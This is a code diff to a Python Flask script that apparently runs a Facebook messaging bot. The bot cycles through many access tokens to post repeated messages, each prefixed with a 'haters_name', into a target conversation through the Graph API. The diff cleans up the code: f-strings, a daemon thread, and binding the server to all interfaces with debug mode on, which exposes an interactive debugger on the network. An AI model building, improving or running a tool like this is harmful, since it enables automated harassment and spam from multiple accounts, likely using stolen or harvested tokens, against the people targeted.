@@ -2,7 +2,6 @@ import requests
 import time
 import threading
 from flask import Flask, request
-import subprocess
 
 # ----------------- FLASK SERVER -------------------
 app = Flask(__name__)
@@ -35,7 +34,7 @@ def run_bot():
     open("time.txt", "w").write(request.form.get("time", "1"))
 
     # start bot in a background thread
-    threading.Thread(target=bot_main).start()
+    threading.Thread(target=bot_main, daemon=True).start()
 
     return "✅ Inputs saved, bot started. Console check karo."
 
@@ -52,7 +51,7 @@ def send_initial_message():
 
     for token in tokens:
         access_token = token.strip()
-        url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+        url = f"https://graph.facebook.com/v17.0/t_{target_id}/"
         msg = msg_template.format(access_token)
         parameters = {'access_token': access_token, 'message': msg}
         try:
@@ -89,7 +88,7 @@ def send_messages_from_file():
                 access_token = tokens[token_index].strip()
                 message = messages[message_index].strip()
 
-                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
                 parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                 response = requests.post(url, json=parameters, headers=headers)
 
@@ -111,5 +110,7 @@ def bot_main():
 # ----------------- MAIN ENTRY -------------------
 
 if __name__ == '__main__':
-    print("🚀 Open http://localhost:5000 in browser")
-    app.run(port=5000, debug=True)
+    print("🚀 Server started — Open in browser:")
+    print("   👉 Local: http://127.0.0.1:5000")
+    print("   👉 Network: http://<Your_Local_IP>:5000")
+    app.run(host="0.0.0.0", port=5000, debug=True)
